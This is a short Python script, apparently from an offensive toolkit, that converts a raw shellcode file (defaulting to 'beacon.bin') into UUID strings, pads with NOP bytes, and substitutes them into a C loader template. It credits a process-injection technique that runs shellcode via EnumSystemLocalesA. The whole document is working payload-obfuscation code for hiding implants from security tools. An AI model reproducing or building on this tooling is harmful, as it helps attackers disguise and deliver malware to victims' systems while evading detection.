#!/usr/bin/env python3

import argparse
import sys
from uuid import UUID

def insert_uuid(uuid):
    with open('main.c.template') as template_file:
        template = template_file.read()
        template = template.replace('###UUID###', uuid)
        return template


def bin_to_uuid(bin_file):
    # Author: Bobby Cooke (0xBoku/boku/boku7) // https://twitter.com/0xBoku // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
    # Modified code from: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
    uuids = ''
    try:
        with open(bin_file, 'rb') as binfile:
            uuids = ''
            chunk = binfile.read(16)
            while chunk:
                if len(chunk) < 16:
                    padding = 16 - len(chunk)
                    chunk = chunk + (b"\x90" * padding)
                    uuids += "{}\"{}\"\n".format(' '*8,UUID(bytes_le=chunk))
                    break
                uuids += "{}\"{}\",\n".format(' '*8,UUID(bytes_le=chunk))
                chunk = binfile.read(16)
        return uuids
    except FileNotFoundError:
        exit("\nThe shellcode file you specified does not exist! Exiting...\n")



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode. Defaults to beacon.bin.")
    
    if len(sys.argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # Parse our raw shellcode and format it to UUIDs
    uuids = bin_to_uuid(args.input)


    # print out UUIDs
    print(uuids)


if __name__ == '__main__':
    main()
